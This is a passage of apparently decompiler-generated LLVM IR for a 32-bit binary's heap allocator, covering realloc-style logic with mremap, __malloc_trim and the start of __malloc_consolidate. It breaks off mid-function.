  store i32 %v3_805328e, i32* %v3_8053294, align 4
  %v0_8053297 = load i32, i32* @esi, align 4
  %v1_8053297 = add i32 %v0_8053297, 16
  %v2_8053297 = inttoptr i32 %v1_8053297 to i32*
  %v3_8053297 = load i32, i32* %v2_8053297, align 4
  store i32 %v3_8053297, i32* %eax.global-to-local, align 4
  %v1_805329a = load i32, i32* @edx, align 4
  %v2_805329a = add i32 %v1_805329a, 16
  %v3_805329a = inttoptr i32 %v2_805329a to i32*
  store i32 %v3_8053297, i32* %v3_805329a, align 4
  %tmp22 = icmp ult i32 %v0_8053291, 7
  br i1 %tmp22, label %dec_label_pc_80532bc, label %dec_label_pc_805329f

dec_label_pc_805329f:                             ; preds = %dec_label_pc_805328e
  %v0_805329f = load i32, i32* @esi, align 4
  %v1_805329f = add i32 %v0_805329f, 20
  %v2_805329f = inttoptr i32 %v1_805329f to i32*
  %v3_805329f = load i32, i32* %v2_805329f, align 4
  store i32 %v3_805329f, i32* %eax.global-to-local, align 4
  %v0_80532a2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80532a5 = load i32, i32* @edx, align 4
  %v2_80532a5 = add i32 %v1_80532a5, 20
  %v3_80532a5 = inttoptr i32 %v2_80532a5 to i32*
  store i32 %v3_805329f, i32* %v3_80532a5, align 4
  %v0_80532a8 = load i32, i32* @esi, align 4
  %v1_80532a8 = add i32 %v0_80532a8, 24
  %v2_80532a8 = inttoptr i32 %v1_80532a8 to i32*
  %v3_80532a8 = load i32, i32* %v2_80532a8, align 4
  store i32 %v3_80532a8, i32* %eax.global-to-local, align 4
  %v1_80532ab = load i32, i32* @edx, align 4
  %v2_80532ab = add i32 %v1_80532ab, 24
  %v3_80532ab = inttoptr i32 %v2_80532ab to i32*
  store i32 %v3_80532a8, i32* %v3_80532ab, align 4
  %tmp23 = icmp ult i32 %v0_80532a2, 9
  br i1 %tmp23, label %dec_label_pc_80532bc, label %dec_label_pc_80532b0

dec_label_pc_80532b0:                             ; preds = %dec_label_pc_805329f
  %v0_80532b0 = load i32, i32* @esi, align 4
  %v1_80532b0 = add i32 %v0_80532b0, 28
  %v2_80532b0 = inttoptr i32 %v1_80532b0 to i32*
  %v3_80532b0 = load i32, i32* %v2_80532b0, align 4
  store i32 %v3_80532b0, i32* %eax.global-to-local, align 4
  %v1_80532b3 = load i32, i32* @edx, align 4
  %v2_80532b3 = add i32 %v1_80532b3, 28
  %v3_80532b3 = inttoptr i32 %v2_80532b3 to i32*
  store i32 %v3_80532b0, i32* %v3_80532b3, align 4
  %v0_80532b6 = load i32, i32* @esi, align 4
  %v1_80532b6 = add i32 %v0_80532b6, 32
  %v2_80532b6 = inttoptr i32 %v1_80532b6 to i32*
  %v3_80532b6 = load i32, i32* %v2_80532b6, align 4
  store i32 %v3_80532b6, i32* %eax.global-to-local, align 4
  %v1_80532b9 = load i32, i32* @edx, align 4
  %v2_80532b9 = add i32 %v1_80532b9, 32
  %v3_80532b9 = inttoptr i32 %v2_80532b9 to i32*
  store i32 %v3_80532b6, i32* %v3_80532b9, align 4
  br label %dec_label_pc_80532bc

dec_label_pc_80532bc:                             ; preds = %dec_label_pc_805329f, %dec_label_pc_805328e, %dec_label_pc_8053275, %dec_label_pc_8053264, %dec_label_pc_80532b0
  %v0_80532bf = load i32, i32* %ebx.global-to-local, align 4
  %v1_80532bf = add i32 %v0_80532bf, 8
  store i32 %v1_80532bf, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80532c6 = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_80533ec

dec_label_pc_80532d0:                             ; preds = %dec_label_pc_8053191, %dec_label_pc_8053247, %dec_label_pc_8053215
  %v1_80532e1 = phi i32 [ %v1_8053181, %dec_label_pc_8053191 ], [ %v2_805324e, %dec_label_pc_8053247 ], [ %v0_80532d0.pre, %dec_label_pc_8053215 ]
  %v5_80532d2 = sub i32 %v1_80532e1, %stack_var_-40.0
  store i32 %v5_80532d2, i32* %ecx.global-to-local, align 4
  %tmp24 = icmp ult i32 %v5_80532d2, 16
  br i1 %tmp24, label %dec_label_pc_80532db, label %dec_label_pc_80532ed

dec_label_pc_80532db:                             ; preds = %dec_label_pc_80532d0
  %v0_80532db = load i32, i32* @edi, align 4
  %v1_80532db = add i32 %v0_80532db, 4
  %v2_80532db = inttoptr i32 %v1_80532db to i32*
  %v3_80532db = load i32, i32* %v2_80532db, align 4
  %v1_80532de = urem i32 %v3_80532db, 2
  %v2_80532e1 = or i32 %v1_80532de, %v1_80532e1
  store i32 %v2_80532e1, i32* %eax.global-to-local, align 4
  store i32 %v2_80532e1, i32* %v2_80532db, align 4
  %v0_80532e6 = load i32, i32* @edi, align 4
  %v1_80532e6 = load i32, i32* @ebx, align 4
  %v2_80532e6 = add i32 %v0_80532e6, 4
  %v3_80532e6 = add i32 %v2_80532e6, %v1_80532e6
  %v4_80532e6 = inttoptr i32 %v3_80532e6 to i32*
  %v5_80532e6 = load i32, i32* %v4_80532e6, align 4
  %v6_80532e6 = or i32 %v5_80532e6, 1
  store i32 %v6_80532e6, i32* %v4_80532e6, align 4
  br label %dec_label_pc_805331d

dec_label_pc_80532ed:                             ; preds = %dec_label_pc_80532d0
  %v0_80532f1 = load i32, i32* @edi, align 4
  %v2_80532f1 = add i32 %v0_80532f1, %stack_var_-40.0
  store i32 %v2_80532f1, i32* %eax.global-to-local, align 4
  %v1_80532f4 = add i32 %v0_80532f1, 4
  %v2_80532f4 = inttoptr i32 %v1_80532f4 to i32*
  %v3_80532f4 = load i32, i32* %v2_80532f4, align 4
  %v1_80532f7 = urem i32 %v3_80532f4, 2
  %v5_80532fa = or i32 %v1_80532f7, %stack_var_-40.0
  store i32 %v5_80532fa, i32* %v2_80532f4, align 4
  %v0_8053304 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053306 = or i32 %v0_8053304, 1
  store i32 %v1_8053306, i32* @edx, align 4
  %v1_8053309 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053309 = add i32 %v1_8053309, 4
  %v3_8053309 = inttoptr i32 %v2_8053309 to i32*
  store i32 %v1_8053306, i32* %v3_8053309, align 4
  %v0_805330c = load i32, i32* %eax.global-to-local, align 4
  %v1_805330c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805330c = add i32 %v0_805330c, 4
  %v3_805330c = add i32 %v2_805330c, %v1_805330c
  %v4_805330c = inttoptr i32 %v3_805330c to i32*
  %v5_805330c = load i32, i32* %v4_805330c, align 4
  %v6_805330c = or i32 %v5_805330c, 1
  store i32 %v6_805330c, i32* %v4_805330c, align 4
  %v0_8053311 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053311 = add i32 %v0_8053311, 8
  store i32 %v1_8053311, i32* %eax.global-to-local, align 4
  store i32 %v1_8053311, i32* %stack_var_-60, align 4
  %v1_8053315 = call i32 @free(i32 %v1_8053311)
  store i32 %v1_8053315, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805331d

dec_label_pc_805331d:                             ; preds = %dec_label_pc_80532db, %dec_label_pc_80532ed
  %v0_805331d = load i32, i32* @edi, align 4
  %v1_805331d = add i32 %v0_805331d, 8
  store i32 %v1_805331d, i32* @ebx, align 4
  br label %dec_label_pc_80533f9

dec_label_pc_8053325:                             ; preds = %dec_label_pc_8053175
  store i32 %tmp7, i32* %ecx.global-to-local, align 4
  %v0_8053329 = load i32, i32* @global_var_8061bbc.500, align 4
  %v1_805332e = add i32 %v0_8053329, -1
  store i32 %v1_805332e, i32* %eax.global-to-local, align 4
  %v2_8053333 = inttoptr i32 %v1_8053179 to i32*
  %v3_8053333 = load i32, i32* %v2_8053333, align 4
  store i32 %v3_8053333, i32* @ebp, align 4
  %v1_8053336 = or i32 %stack_var_-40.0, 4
  store i32 %v1_8053336, i32* %stack_var_-44, align 4
  %v2_805333c = add i32 %v3_8053333, %v1_805332e
  store i32 %v2_805333c, i32* @edx, align 4
  %v1_805333f = sub i32 0, %v0_8053329
  store i32 %v1_805333f, i32* %eax.global-to-local, align 4
  %v2_8053341 = add i32 %v2_805333c, %v1_8053336
  %v2_8053344 = and i32 %v2_8053341, %v1_805333f
  store i32 %v2_8053344, i32* @esi, align 4
  %v2_8053348 = sub i32 %v2_8053344, %v3_8053333
  store i32 %v2_8053348, i32* @ebx, align 4
  %v15_805334a = icmp eq i32 %v1_8053181, %v2_8053348
  br i1 %v15_805334a, label %dec_label_pc_80533f5, label %dec_label_pc_8053354

dec_label_pc_8053354:                             ; preds = %dec_label_pc_8053325
  %v2_805335b = sub i32 %v1_8053179, %v3_8053333
  store i32 %v2_805335b, i32* @edi, align 4
  %v2_805335d = add i32 %v3_8053333, %v1_8053181
  store i32 %v2_805335d, i32* %eax.global-to-local, align 4
  store i32 %v2_805335b, i32* %stack_var_-60, align 4
  %v6_8053361 = call i32 @mremap(i32 %v2_805335b, i32 %v2_805335d, i32 %v2_8053344, i32 1, i32 %v1_8053336, i32 %v1_8053181)
  store i32 %v6_8053361, i32* %eax.global-to-local, align 4
  %v10_8053369 = icmp eq i32 %v6_8053361, -1
  br i1 %v10_8053369, label %dec_label_pc_80533ad, label %dec_label_pc_805336e

dec_label_pc_805336e:                             ; preds = %dec_label_pc_8053354
  %v1_805336e = load i32, i32* @ebp, align 4
  %v2_805336e = add i32 %v1_805336e, %v6_8053361
  store i32 %v2_805336e, i32* @edx, align 4
  %v0_8053371 = load i32, i32* @ebx, align 4
  %v1_8053371 = or i32 %v0_8053371, 2
  store i32 %v1_8053371, i32* %ebx.global-to-local, align 4
  %v0_8053374 = load i32, i32* @esi, align 4
  store i32 %v0_8053374, i32* %eax.global-to-local, align 4
  %v2_8053376 = add i32 %v2_805336e, 4
  %v3_8053376 = inttoptr i32 %v2_8053376 to i32*
  store i32 %v1_8053371, i32* %v3_8053376, align 4
  %v0_8053379 = load i32, i32* %eax.global-to-local, align 4
  %v5_8053379 = sub i32 %v0_8053379, %v1_8053181
  %v1_805337d = load i32, i32* @global_var_8061bc4.505, align 4
  %v2_805337d = add i32 %v1_805337d, %v5_8053379
  store i32 %v2_805337d, i32* %eax.global-to-local, align 4
  store i32 %v2_805337d, i32* @global_var_8061bc4.505, align 4
  %v1_8053388 = load i32, i32* @global_var_8061bd0.506, align 16
  %tmp25 = icmp ugt i32 %v2_805337d, %v1_8053388
  br i1 %tmp25, label %dec_label_pc_8053390, label %dec_label_pc_8053395

dec_label_pc_8053390:                             ; preds = %dec_label_pc_805336e
  store i32 %v2_805337d, i32* @global_var_8061bd0.506, align 16
  br label %dec_label_pc_8053395

dec_label_pc_8053395:                             ; preds = %dec_label_pc_805336e, %dec_label_pc_8053390
  %v1_8053395 = load i32, i32* @global_var_8061bc8.507, align 8
  %v2_8053395 = add i32 %v1_8053395, %v2_805337d
  store i32 %v2_8053395, i32* %eax.global-to-local, align 4
  %v1_805339b = load i32, i32* @global_var_8061bd4.508, align 4
  %tmp26 = icmp ugt i32 %v2_8053395, %v1_805339b
  br i1 %tmp26, label %dec_label_pc_80533a3, label %dec_label_pc_80533a8

dec_label_pc_80533a3:                             ; preds = %dec_label_pc_8053395
  store i32 %v2_8053395, i32* @global_var_8061bd4.508, align 4
  br label %dec_label_pc_80533a8

dec_label_pc_80533a8:                             ; preds = %dec_label_pc_8053395, %dec_label_pc_80533a3
  %v0_80533a8 = load i32, i32* @edx, align 4
  %v1_80533a8 = add i32 %v0_80533a8, 8
  store i32 %v1_80533a8, i32* @ebx, align 4
  br label %dec_label_pc_80533f9

dec_label_pc_80533ad:                             ; preds = %dec_label_pc_8053354
  %v2_80533ad = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_80533ad, i32* %eax.global-to-local, align 4
  %v10_80533b0 = icmp ult i32 %v1_8053181, %v2_80533ad
  %v1_80533b4 = icmp eq i1 %v10_80533b0, false
  br i1 %v1_80533b4, label %dec_label_pc_80533f5, label %dec_label_pc_80533b6

dec_label_pc_80533b6:                             ; preds = %dec_label_pc_80533ad
  %v1_80533bd = add i32 %stack_var_-40.0, -7
  store i32 %v1_80533bd, i32* %eax.global-to-local, align 4
  store i32 %v1_80533bd, i32* %stack_var_-60, align 4
  %v1_80533c1 = call i32 @malloc(i32 %v1_80533bd)
  store i32 %v1_80533c1, i32* %eax.global-to-local, align 4
  store i32 %v1_80533c1, i32* @ebx, align 4
  %v1_80533cb = icmp eq i32 %v1_80533c1, 0
  br i1 %v1_80533cb, label %dec_label_pc_80533f1, label %dec_label_pc_80533cf

dec_label_pc_80533cf:                             ; preds = %dec_label_pc_80533b6
  %v1_80533d4 = add i32 %v1_8053181, -8
  store i32 %v1_80533d4, i32* %eax.global-to-local, align 4
  store i32 %v1_80533c1, i32* %stack_var_-60, align 4
  %v3_80533dd = inttoptr i32 %v1_80533c1 to i16*
  %v4_80533dd = call i32 @memcpy(i16* %v3_80533dd, i32 %tmp7, i32 %v1_80533d4)
  store i32 %v4_80533dd, i32* %eax.global-to-local, align 4
  store i32 %v1_80533c1, i32* @edx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80533e7 = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_80533ec

dec_label_pc_80533ec:                             ; preds = %dec_label_pc_80532bc, %dec_label_pc_80533cf
  %storemerge = phi i32 [ %v1_80533e7, %dec_label_pc_80533cf ], [ %v1_80532c6, %dec_label_pc_80532bc ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80533f9

dec_label_pc_80533f1:                             ; preds = %dec_label_pc_80533b6, %dec_label_pc_8053220
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80533f9

dec_label_pc_80533f5:                             ; preds = %dec_label_pc_80533ad, %dec_label_pc_8053325, %dec_label_pc_80531bf
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_80533f9

dec_label_pc_80533f9:                             ; preds = %dec_label_pc_80533f1, %dec_label_pc_80533ec, %dec_label_pc_80533a8, %dec_label_pc_805331d, %dec_label_pc_80533f5
  store i32 %v2_805312e, i32* @eax, align 4
  store i32 %v2_805312e, i32* %stack_var_-60, align 4
  %v2_8053402 = call i32 @__pthread_return_void(i32 %v2_805312e, i32 1)
  store i32 %v2_8053402, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053407

dec_label_pc_8053407:                             ; preds = %dec_label_pc_8053112, %dec_label_pc_80530fe, %dec_label_pc_80533f9
  br label %dec_label_pc_805340a

dec_label_pc_805340a:                             ; preds = %dec_label_pc_805314c, %dec_label_pc_8053407
  %v0_805340d = load i32, i32* @ebx, align 4
  store i32 %v0_805340d, i32* %eax.global-to-local, align 4
  store i32 %v0_80530ef, i32* %ebx.global-to-local, align 4
  store i32 %v0_80530ee, i32* @esi, align 4
  ret i32 %v0_805340d

; uselistorder directives
  uselistorder i32 %v1_80533c1, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8053395, { 1, 0, 2 }
  uselistorder i32 %v2_805337d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805335b, { 1, 0, 2 }
  uselistorder i32 %v1_8053336, { 1, 0, 2 }
  uselistorder i32 %v3_8053333, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_80532f1, { 1, 0 }
  uselistorder i32 %v1_8053257, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_805322b, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_80531cf, { 1, 0, 2 }
  uselistorder i32 %v3_80531e2, { 0, 2, 1 }
  uselistorder i32 %v2_805319f, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8053181, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8053179, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_805316e, { 1, 0 }
  uselistorder i32 %v1_805315e, { 0, 2, 1 }
  uselistorder i32 %v0_8053147, { 1, 0 }
  uselistorder i32 %v2_805312e, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_805340a, { 1, 0 }
  uselistorder label %dec_label_pc_8053407, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80533f9, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80533ec, { 1, 0 }
  uselistorder label %dec_label_pc_80533a8, { 1, 0 }
  uselistorder label %dec_label_pc_8053395, { 1, 0 }
  uselistorder label %dec_label_pc_805331d, { 1, 0 }
  uselistorder label %dec_label_pc_80532d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80532bc, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053215, { 1, 0 }
  uselistorder label %dec_label_pc_8053175, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_805341b = load i32, i32* @edx, align 4
  store i32 %v0_805341b, i32* %ebp.global-to-local, align 4
  %v1_805341d = add i32 %v0_805341b, 860
  %v2_805341d = inttoptr i32 %v1_805341d to i32*
  %v3_805341d = load i32, i32* %v2_805341d, align 4
  store i32 %v3_805341d, i32* @ecx, align 4
  %v1_8053423 = add i32 %v0_805341b, 44
  %v2_8053423 = inttoptr i32 %v1_8053423 to i32*
  %v3_8053423 = load i32, i32* %v2_8053423, align 4
  %v1_8053426 = add i32 %v3_8053423, 4
  %v2_8053426 = inttoptr i32 %v1_8053426 to i32*
  %v3_8053426 = load i32, i32* %v2_8053426, align 4
  %v1_8053429 = and i32 %v3_8053426, -4
  store i32 %v1_8053429, i32* @esi, align 4
  %v1_805342e = load i32, i32* @eax, align 4
  %v2_805342e = add i32 %v3_805341d, -17
  %v2_8053430 = add i32 %v2_805342e, %v1_8053429
  %v3_8053430 = sub i32 %v2_8053430, %v1_805342e
  %div = udiv i32 %v3_8053430, %v3_805341d
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8053430, %v3_805341d
  store i32 %tmp10, i32* @edx, align 4
  %v1_8053438 = add i32 %div, -1
  %v4_805343b = mul i32 %v1_8053438, %v3_805341d
  store i32 %v4_805343b, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805343b, 1
  br i1 %tmp11, label %dec_label_pc_8053497, label %dec_label_pc_8053442

dec_label_pc_8053442:                             ; preds = %entry
  %v1_8053447 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053447, i32* %edi.global-to-local, align 4
  %v0_805344e = load i32, i32* @esi, align 4
  store i32 %v0_805344e, i32* %eax.global-to-local, align 4
  %v1_8053450 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053450 = add i32 %v1_8053450, 44
  %v3_8053450 = inttoptr i32 %v2_8053450 to i32*
  %v4_8053450 = load i32, i32* %v3_8053450, align 4
  %v5_8053450 = add i32 %v4_8053450, %v0_805344e
  store i32 %v5_8053450, i32* %eax.global-to-local, align 4
  %v12_8053456 = icmp eq i32 %v1_8053447, %v5_8053450
  %v1_8053458 = icmp eq i1 %v12_8053456, false
  br i1 %v1_8053458, label %dec_label_pc_8053497, label %dec_label_pc_805345a

dec_label_pc_805345a:                             ; preds = %dec_label_pc_8053442
  %v1_805345d = sub i32 0, %v4_805343b
  store i32 %v1_805345d, i32* @ebx, align 4
  %v1_8053460 = call i32 @__GI_sbrk(i32 %v1_805345d)
  store i32 %v1_8053460, i32* %eax.global-to-local, align 4
  %v1_805346c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805346c, i32* %eax.global-to-local, align 4
  %v10_8053474 = icmp eq i32 %v1_805346c, -1
  br i1 %v10_8053474, label %dec_label_pc_8053497, label %dec_label_pc_8053479

dec_label_pc_8053479:                             ; preds = %dec_label_pc_805345a
  %v0_8053479 = load i32, i32* %edi.global-to-local, align 4
  %v2_805347b = sub i32 %v0_8053479, %v1_805346c
  %v12_805347b = icmp eq i32 %v2_805347b, 0
  store i32 %v2_805347b, i32* @ecx, align 4
  br i1 %v12_805347b, label %dec_label_pc_8053497, label %dec_label_pc_805347f

dec_label_pc_805347f:                             ; preds = %dec_label_pc_8053479
  %v0_805347f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805347f = add i32 %v0_805347f, 44
  %v2_805347f = inttoptr i32 %v1_805347f to i32*
  %v3_805347f = load i32, i32* %v2_805347f, align 4
  store i32 %v3_805347f, i32* %eax.global-to-local, align 4
  %v1_8053482 = add i32 %v0_805347f, 872
  %v2_8053482 = inttoptr i32 %v1_8053482 to i32*
  %v3_8053482 = load i32, i32* %v2_8053482, align 4
  %v5_8053482 = sub i32 %v3_8053482, %v2_805347b
  store i32 %v5_8053482, i32* %v2_8053482, align 4
  %v0_8053488 = load i32, i32* @esi, align 4
  %v1_8053488 = load i32, i32* @ecx, align 4
  %v2_8053488 = sub i32 %v0_8053488, %v1_8053488
  %v1_805348a = or i32 %v2_8053488, 1
  %v1_805348d = load i32, i32* %eax.global-to-local, align 4
  %v2_805348d = add i32 %v1_805348d, 4
  %v3_805348d = inttoptr i32 %v2_805348d to i32*
  store i32 %v1_805348a, i32* %v3_805348d, align 4
  br label %dec_label_pc_8053499

dec_label_pc_8053497:                             ; preds = %dec_label_pc_8053479, %dec_label_pc_805345a, %dec_label_pc_8053442, %entry
  br label %dec_label_pc_8053499

dec_label_pc_8053499:                             ; preds = %dec_label_pc_805347f, %dec_label_pc_8053497
  %storemerge = phi i32 [ 1, %dec_label_pc_805347f ], [ 0, %dec_label_pc_8053497 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805346c, { 1, 0, 2 }
  uselistorder i32 %v4_805343b, { 1, 2, 0 }
  uselistorder i32 %v3_805341d, { 0, 3, 2, 1, 4 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053499, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_80534a2 = load i32, i32* @edi, align 4
  %v0_80534a3 = load i32, i32* @esi, align 4
  %v0_80534a4 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_80534ac = load i32, i32* %arg1, align 4
  store i32 %v2_80534ac, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80534b3 = icmp eq i32 %v2_80534ac, 0
  br i1 %v1_80534b3, label %dec_label_pc_80535dc.preheader, label %dec_label_pc_80534bb

dec_label_pc_80535dc.preheader:                   ; preds = %entry
  %v3_80535d1 = add i32 %tmp11, 44
  br label %dec_label_pc_80535cd

dec_label_pc_80534bb:                             ; preds = %entry
  %v1_80534bf = and i32 %v2_80534ac, -3
  store i32 %v1_80534bf, i32* %arg1, align 4
  %v1_80534c4 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_80534cf = add i32 %tmp11, 4
  store i32 %v1_80534cf, i32* %eax.global-to-local, align 4
  %v2_80534da = load i32, i32* %arg1, align 4
  %v2_80534e0 = udiv i32 %v2_80534da, 8
  %v2_80534e3 = mul nuw i32 %v2_80534e0, 4
  %v3_80534e3 = add i32 %tmp11, -4
  %v4_80534e3 = add i32 %v3_80534e3, %v2_80534e3
  store i32 %v4_80534e3, i32* %eax.global-to-local, align 4
  %v2_80535aa = add i32 %tmp11, 44
  %v3_80535aa = inttoptr i32 %v2_80535aa to i32*
  %v1_805357d = add i32 %tmp11, 60
  %v2_805357d = inttoptr i32 %v1_805357d to i32*
  br label %dec_label_pc_80534eb

dec_label_pc_80534eb:                             ; preds = %dec_label_pc_80535c3, %dec_label_pc_80534bb
  %v0_80534f9 = phi i32 [ %v1_80534cf, %dec_label_pc_80534bb ], [ %v4_80535c3, %dec_label_pc_80535c3 ]
  store i32 %v0_80534f9, i32* %eax.global-to-local, align 4
  %v1_80534ef = inttoptr i32 %v0_80534f9 to i32*
  %v2_80534ef = load i32, i32* %v1_80534ef, align 4
  store i32 %v2_80534ef, i32* @ecx, align 4
  %v1_80534f1 = icmp eq i32 %v2_80534ef, 0
  br i1 %v1_80534f1, label %dec_label_pc_80535b9, label %dec_label_pc_80534f9

dec_label_pc_80534f9:                             ; preds = %dec_label_pc_80534eb
  store i32 0, i32* %v1_80534ef, align 4
  %v0_80534ff.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80534ff

dec_label_pc_80534ff:                             ; preds = %dec_label_pc_80535ad, %dec_label_pc_80534f9
  %v0_805351c = phi i32 [ %v3_80534ff, %dec_label_pc_80535ad ], [ %v0_80534ff.pre, %dec_label_pc_80534f9 ]
  %v1_80534ff = add i32 %v0_805351c, 8
  %v2_80534ff = inttoptr i32 %v1_80534ff to i32*
  %v3_80534ff = load i32, i32* %v2_80534ff, align 4
  store i32 %v3_80534ff, i32* %edx.global-to-local, align 4
  %v1_8053506 = add i32 %v0_805351c, 4
  %v2_8053506 = inttoptr i32 %v1_8053506 to i32*
  %v3_8053506 = load i32, i32* %v2_8053506, align 4
  store i32 %v3_8053506, i32* %eax.global-to-local, align 4
  %v1_805350b = and i32 %v3_8053506, -2
  store i32 %v1_805350b, i32* @edi, align 4
  %v2_805350e = urem i32 %v3_8053506, 2
  %v3_805350e = icmp eq i32 %v2_805350e, 0
  %v2_8053510 = add i32 %v1_805350b, %v0_805351c
  store i32 %v2_8053510, i32* @ebx, align 4
  %v1_8053513 = add i32 %v2_8053510, 4
  %v2_8053513 = inttoptr i32 %v1_8053513 to i32*
  %v3_8053513 = load i32, i32* %v2_8053513, align 4
  store i32 %v3_8053513, i32* %edx.global-to-local, align 4
  %v1_805351a = icmp eq i1 %v3_805350e, false
  br i1 %v1_805351a, label %dec_label_pc_805353c, label %dec_label_pc_805351c

dec_label_pc_805351c:                             ; preds = %dec_label_pc_80534ff
  %v1_805351c = inttoptr i32 %v0_805351c to i32*
  %v2_805351c = load i32, i32* %v1_805351c, align 4
  store i32 %v2_805351c, i32* %ebp.global-to-local, align 4
  %v2_8053520 = sub i32 %v0_805351c, %v2_805351c
  store i32 %v2_8053520, i32* %eax.global-to-local, align 4
  %v1_8053522 = add i32 %v2_8053520, 8
  %v2_8053522 = inttoptr i32 %v1_8053522 to i32*
  %v3_8053522 = load i32, i32* %v2_8053522, align 4
  store i32 %v3_8053522, i32* @esi, align 4
  %v1_8053525 = add i32 %v2_8053520, 12
  %v2_8053525 = inttoptr i32 %v1_8053525 to i32*
  %v3_8053525 = load i32, i32* %v2_8053525, align 4
  store i32 %v3_8053525, i32* %edx.global-to-local, align 4
  %v1_8053528 = add i32 %v3_8053522, 12
  %v2_8053528 = inttoptr i32 %v1_8053528 to i32*
  %v3_8053528 = load i32, i32* %v2_8053528, align 4
  store i32 %v3_8053528, i32* @ecx, align 4
  %v12_805352b = icmp eq i32 %v3_8053528, %v2_8053520
  %v1_805352d = icmp eq i1 %v12_805352b, false
  br i1 %v1_805352d, label %dec_label_pc_805356c, label %dec_label_pc_805352f

dec_label_pc_805352f:                             ; preds = %dec_label_pc_805351c
  %v1_805352f = add i32 %v3_8053525, 8
  %v2_805352f = inttoptr i32 %v1_805352f to i32*
  %v3_805352f = load i32, i32* %v2_805352f, align 4
  %v15_805352f = icmp eq i32 %v3_805352f, %v3_8053528
  %v1_8053532 = icmp eq i1 %v15_805352f, false
  br i1 %v1_8053532, label %dec_label_pc_805356c, label %dec_label_pc_8053534

dec_label_pc_8053534:                             ; preds = %dec_label_pc_805352f
  %v2_8053534 = add i32 %v2_805351c, %v1_805350b
  store i32 %v2_8053534, i32* @edi, align 4
  store i32 %v3_8053525, i32* %v2_8053528, align 4
  %v0_8053539 = load i32, i32* @esi, align 4
  %v1_8053539 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053539 = add i32 %v1_8053539, 8
  %v3_8053539 = inttoptr i32 %v2_8053539 to i32*
  store i32 %v0_8053539, i32* %v3_8053539, align 4
  %v0_8053547.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805353c

dec_label_pc_805353c:                             ; preds = %dec_label_pc_80534ff, %dec_label_pc_8053534
  %v1_8053550 = phi i32 [ %v2_8053510, %dec_label_pc_80534ff ], [ %v0_8053547.pre, %dec_label_pc_8053534 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8053544 = and i32 %v3_8053513, -4
  store i32 %v1_8053544, i32* %ebp.global-to-local, align 4
  %v4_8053547 = load i32, i32* %v3_80535aa, align 4
  %v15_8053547 = icmp eq i32 %v1_8053550, %v4_8053547
  br i1 %v15_8053547, label %dec_label_pc_805359d, label %dec_label_pc_805354c

dec_label_pc_805354c:                             ; preds = %dec_label_pc_805353c
  %v2_805354c = add i32 %v1_8053550, 4
